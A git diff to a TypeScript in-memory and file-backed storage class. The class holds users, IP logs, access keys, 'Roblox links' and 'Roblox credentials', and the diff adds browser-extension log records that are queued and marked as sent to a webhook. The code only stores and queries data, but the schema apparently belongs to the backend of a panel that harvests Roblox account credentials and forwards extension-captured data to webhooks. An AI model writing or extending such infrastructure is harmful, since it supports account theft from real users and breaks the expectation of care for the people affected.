@@ -1,7 +1,7 @@
-import { type User, type InsertUser, type IpLog, type InsertIpLog, type Settings, type InsertSettings, type AccessKey, type InsertAccessKey, type UserSession, type InsertUserSession, type RobloxLink, type InsertRobloxLink, type RobloxCredentials, type InsertRobloxCredentials } from "@shared/schema";
+import { type User, type InsertUser, type IpLog, type InsertIpLog, type Settings, type InsertSettings, type AccessKey, type InsertAccessKey, type UserSession, type InsertUserSession, type RobloxLink, type InsertRobloxLink, type RobloxCredentials, type InsertRobloxCredentials, type ExtensionLog, type InsertExtensionLog } from "@shared/schema";
 import { randomUUID } from "crypto";
 import { desc, eq } from "drizzle-orm";
-import { users, ipLogs, settings, accessKeys, userSessions, robloxLinks, robloxCredentials } from "@shared/schema";
+import { users, ipLogs, settings, accessKeys, userSessions, robloxLinks, robloxCredentials, extensionLogs } from "@shared/schema";
 import fs from 'fs/promises'; // Use fs.promises for async operations
 import path from 'path'; // Import path module
 import bcrypt from "bcryptjs";
@@ -61,6 +61,14 @@ export interface IStorage {
   createRobloxCredentials(credentials: InsertRobloxCredentials): Promise<RobloxCredentials>;
   getRobloxCredentials(userId: string): Promise<RobloxCredentials[]>;
   getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]>;
+
+  // Extension Log operations
+  createExtensionLog(extensionLog: InsertExtensionLog): Promise<ExtensionLog>;
+  getExtensionLogs(userId?: string, limit?: number, offset?: number): Promise<ExtensionLog[]>;
+  getTotalExtensionLogs(userId?: string): Promise<number>;
+  getRecentExtensionLogs(userId?: string, hours?: number): Promise<ExtensionLog[]>;
+  updateExtensionLogWebhookSent(logId: string): Promise<void>;
+  getExtensionLogsForWebhook(limit?: number): Promise<ExtensionLog[]>;
 }
 
 export class MemStorage implements IStorage {
@@ -72,6 +80,7 @@ export class MemStorage implements IStorage {
   private sessions: Map<string, UserSession>;
   private robloxLinks: Map<string, RobloxLink>;
   private robloxCredentials: Map<string, RobloxCredentials>;
+  private extensionLogs: Map<string, ExtensionLog>;
 
   // File-based persistence for critical data
   private dataFilePath = path.join(import.meta.dirname, 'data-backup.json');
@@ -124,6 +133,7 @@ export class MemStorage implements IStorage {
     this.sessions = new Map();
     this.robloxLinks = new Map();
     this.robloxCredentials = new Map();
+    this.extensionLogs = new Map();
 
     // Load persisted data first, then initialize dev account
     this.loadFromFileSystem().then(() => {
@@ -176,8 +186,9 @@ export class MemStorage implements IStorage {
         accessKeys: Array.from(this.accessKeys.entries()),
         robloxLinks: Array.from(this.robloxLinks.entries()),
         robloxCredentials: Array.from(this.robloxCredentials.entries()),
+        extensionLogs: Array.from(this.extensionLogs.entries()),
         timestamp: new Date().toISOString(),
-        version: '2.2'
+        version: '2.3'
       };
 
       // Create multiple backup files for extra safety
@@ -256,6 +267,7 @@ export class MemStorage implements IStorage {
           this.sessions = new Map(Array.isArray(data.sessions) ? data.sessions : []);
           this.robloxLinks = new Map(Array.isArray(data.robloxLinks) ? data.robloxLinks : []);
           this.robloxCredentials = new Map(Array.isArray(data.robloxCredentials) ? data.robloxCredentials : []);
+          this.extensionLogs = new Map(Array.isArray(data.extensionLogs) ? data.extensionLogs : []);
 
           // Convert date strings back to Date objects with error handling
           this.ipLogs.forEach((log, key) => {
@@ -306,6 +318,19 @@ export class MemStorage implements IStorage {
               key.createdAt = new Date();
               key.expirationDate = null;
               this.accessKeys.set(accessKeyId, key);
+            }
+          });
+
+          this.extensionLogs.forEach((log, key) => {
+            try {
+              if (log.createdAt) log.createdAt = new Date(log.createdAt);
+              if (log.lastWebhookSent) log.lastWebhookSent = new Date(log.lastWebhookSent);
+              this.extensionLogs.set(key, log);
+            } catch (dateError) {
+              console.warn(`Invalid date in extension log ${key}, fixing dates`);
+              log.createdAt = new Date();
+              log.lastWebhookSent = null;
+              this.extensionLogs.set(key, log);
             }
           });
 
@@ -1190,6 +1215,79 @@ export class MemStorage implements IStorage {
 
   async getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]> {
     return Array.from(this.robloxCredentials.values()).filter(cred => cred.linkId === linkId);
+  }
+
+  // Extension Log operations
+  async createExtensionLog(extensionLog: InsertExtensionLog): Promise<ExtensionLog> {
+    const id = randomUUID();
+    const now = new Date();
+    const newExtensionLog: ExtensionLog = {
+      id,
+      ...extensionLog,
+      createdAt: now,
+      lastWebhookSent: null,
+    };
+    this.extensionLogs.set(id, newExtensionLog);
+    
+    try {
+      await this.saveToFileSystem();
+      console.log(`✅ Extension Log saved: ${extensionLog.extensionName} - Total logs: ${this.extensionLogs.size}`);
+    } catch (error) {
+      console.error(`❌ Failed to save extension log: ${error}`);
+      // Don't throw error to prevent blocking the response
+    }
+
+    return newExtensionLog;
+  }
+
+  async getExtensionLogs(userId?: string, limit: number = 50, offset: number = 0): Promise<ExtensionLog[]> {
+    let logs = Array.from(this.extensionLogs.values());
+    if (userId) {
+      logs = logs.filter(log => log.userId === userId);
+    }
+    return logs
+      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
+      .slice(offset, offset + limit);
+  }
+
+  async getTotalExtensionLogs(userId?: string): Promise<number> {
+    if (userId) {
+      return Array.from(this.extensionLogs.values()).filter(log => log.userId === userId).length;
+    }
+    return this.extensionLogs.size;
+  }
+
+  async getRecentExtensionLogs(userId?: string, hours: number = 24): Promise<ExtensionLog[]> {
+    const cutoffTime = new Date(Date.now() - hours * 60 * 60 * 1000);
+    let logs = Array.from(this.extensionLogs.values()).filter(log => 
+      new Date(log.createdAt) > cutoffTime
+    );
+    
+    if (userId) {
+      logs = logs.filter(log => log.userId === userId);
+    }
+    
+    return logs.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+  }
+
+  async updateExtensionLogWebhookSent(logId: string): Promise<void> {
+    const log = this.extensionLogs.get(logId);
+    if (log) {
+      this.extensionLogs.set(logId, { 
+        ...log, 
+        lastWebhookSent: new Date() 
+      });
+      await this.saveToFileSystem();
+    }
+  }
+
+  async getExtensionLogsForWebhook(limit: number = 100): Promise<ExtensionLog[]> {
+    // Get logs that haven't been sent to webhook recently (within last hour)
+    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
+    return Array.from(this.extensionLogs.values())
+      .filter(log => !log.lastWebhookSent || new Date(log.lastWebhookSent) < oneHourAgo)
+      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
+      .slice(0, limit);
   }
 }
 
